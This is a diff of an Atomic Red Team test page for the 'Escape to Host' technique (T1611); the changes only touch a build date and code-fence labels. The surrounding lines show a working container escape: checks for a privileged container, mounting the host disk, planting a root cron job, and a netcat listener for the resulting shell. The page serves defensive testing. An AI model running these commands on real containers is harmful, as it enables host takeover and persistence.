@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1611"
 attack_technique_name: "Escape to Host"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "sh"
 aliases:
   - "6c499943-b098-4bc6-8d38-0956fc182984"
@@ -84,13 +84,13 @@ Verify mount is installed.
 
 ### Prerequisite Check
 
-```text
+```bash
 which mount
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 if [ "" == "`which mount`" ]; then echo "mount Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install mount ; elif [ -n "`which yum`" ]; then sudo yum -y install mount ; fi ; else echo "mount installed"; fi
 ```
 
@@ -98,13 +98,13 @@ Verify container is privileged.
 
 ### Prerequisite Check
 
-```text
+```bash
 capsh --print | grep cap_sys_admin
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 if [ "`capsh --print | grep cap_sys_admin`" == "" ]; then echo "Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
 ```
 
@@ -112,13 +112,13 @@ Verify mount device (/dev/dm-0) exists.
 
 ### Prerequisite Check
 
-```text
+```bash
 ls #{mount_device}
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 if [ ! -f #{mount_device} ]; then echo "Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
 ```
 
@@ -126,13 +126,13 @@ Netcat is installed.
 
 ### Prerequisite Check
 
-```text
+```bash
 which netcat
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 if [ "" == "`which netcat`" ]; then echo "netcat Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install netcat ; elif [ -n "`which yum`" ]; then sudo yum -y install netcat ; fi
 ```
 
@@ -140,13 +140,13 @@ IP Address is known.
 
 ### Prerequisite Check
 
-```text
+```bash
 if [ "#{listen_address}" != "" ]; then echo "Listen address set as #{listen_address}" ; fi
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 if [ "" == "`which ifconfig`" ]; then echo "ifconfig Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install net=tools ; elif [ -n "`which yum`" ]; then sudo yum -y install net-tools ; fi
 ```
 
@@ -157,7 +157,7 @@ if [ "" == "`which ifconfig`" ]; then echo "ifconfig Not Found"; if [ -n "`which
 
 ### Command
 
-```sh
+```bash
 if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi
 echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > #{mount_point}#{cron_path}/#{cron_filename}
 echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
@@ -169,7 +169,7 @@ netcat -l -p #{listen_port} 2>&1
 
 ### Cleanup
 
-```sh
+```bash
 rm #{mount_point}#{cron_path}/#{cron_filename}
 umount #{mount_point}
 rmdir #{mount_point}
